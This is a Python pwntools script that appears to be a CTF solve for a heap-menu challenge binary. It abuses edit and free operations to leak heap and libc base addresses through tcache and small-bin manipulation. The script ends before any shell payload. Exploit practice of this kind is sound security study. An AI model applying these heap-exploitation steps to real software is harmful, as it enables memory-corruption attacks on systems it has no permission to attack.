from pwn import *
from pwncli import *
#context(os='linux', arch='mips',endian="little", log_level='debug')
context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='amd64')
context.terminal = ['tmux', 'sp', '-h']
       
rv = lambda x            : io.recv(x)
rl = lambda a=False      : io.recvline(a)
ru = lambda a,b=True     : io.recvuntil(a,b)
rn = lambda x            : io.recvn(x)
sd = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b          : io.sendafter(a,b)
sla = lambda a,b         : io.sendlineafter(a,b)
inter = lambda           : io.interactive()

file_name = "./vuln"
elf=ELF(file_name)
url = ""
port = 0
libc=ELF("./libc.so.6")
def debug(filename = file_name,b_slice=[],is_pie=0,is_start = 1):
    global io
    b_string = ""
    if is_pie:
        for i in b_slice:
            b_string += f"b *$rebase({i})\n"
        for i in range(1,16):
            b_string += f"c\n"
    else:
        for i in b_slice:
            b_string += f"b *{hex(i)}\n"
        for i in range(1,2):
            b_string += f"c\n"            
    if is_start :
        io = gdb.debug(filename,b_string)
        return
    else:
        gdb.attach(io,b_string)
        pause()

b_examp=0x0
b_add=0x014b0
b_show=0x1989 
b_slice = [
    b_add
]
io = process(file_name)
debug(b_slice = b_slice,is_pie=1,is_start=1) # 直接启动带pie

def cha(num):
    return str(num).encode()

def get_addr(arch):
    if arch == 64:
        return u64(io.recv(6).ljust(8,b'\x00'))
        #return u64(io.recv()[-8:].ljust(8,b'\x00')) 
    else:
        return u32(p.recv(4).ljust(4,b'\x00'))
        #return u32(io.recvuntil(b'\xf7')

def add(number,name,size,context):
    io.sendlineafter('>','1')
    io.sendlineafter('>',str(number))
    io.sendlineafter('>',name)
    io.sendlineafter('>',str(size))
    io.sendafter('>',context)

def gift(number,name,addr):
    io.sendlineafter('>','1')
    io.sendlineafter('>',str(number))
    io.sendlineafter('>',name)
    io.sendlineafter('>',str(-9))
    io.sendlineafter('>',addr)

def free(index):
    io.sendlineafter('>','2')
    io.sendlineafter('>',str(index))

def edit(index,number,name,size,context):
    io.sendlineafter('>','3')
    io.sendlineafter('>',str(index))
    io.sendlineafter('>',str(number))
    io.sendlineafter('>',name)
    io.sendlineafter('>',str(size))
    io.sendafter('>',context)

def show(index):
    io.sendlineafter('>','4')
    io.sendlineafter('>',str(index))

for i in range(3):
    add(123,'aaaa',0x18,'aaaa') # 0 1 2
free(0)
edit(1,12,'aa',0x40,'aa') 
add(123,'aaa',0x18,'a'*0x10) # 2
show(2)
io.recvuntil('a'*0x10)
heap_base=u64(io.recv(6).ljust(8,b'\x00'))-0x2d0
success('heap_base:'+hex(heap_base))  

for i in range(9):
    add(12,'bbbb',0x300,'bbbb')
for i in range(8): #free到三号,填满tcache并造出small bin
    free(8+2-i)

add(12,'ddd',0x40,'d') # 4,覆写一个字节也没事,偏移能算出来

show(4)
io.recvuntil('Information: ')
libc_base=u64(io.recv(6).ljust(8,b'\x00'))-0x21af64
success('libc_base:'+hex(libc_base))

inter()